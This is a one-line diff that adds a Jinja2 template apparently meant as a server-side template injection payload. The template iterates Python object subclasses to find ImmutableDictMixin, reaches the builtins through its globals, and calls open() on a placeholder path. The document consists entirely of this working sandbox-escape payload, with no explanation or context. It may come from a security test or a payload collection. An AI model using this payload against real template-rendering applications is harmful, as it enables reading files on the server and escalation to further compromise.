@@ -1,0 +1,1 @@
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='ImmutableDictMixin' %}{{ c.__hash__.__globals__['__builtins__'].open("[evil]") }}{% endif %}{% endfor %}
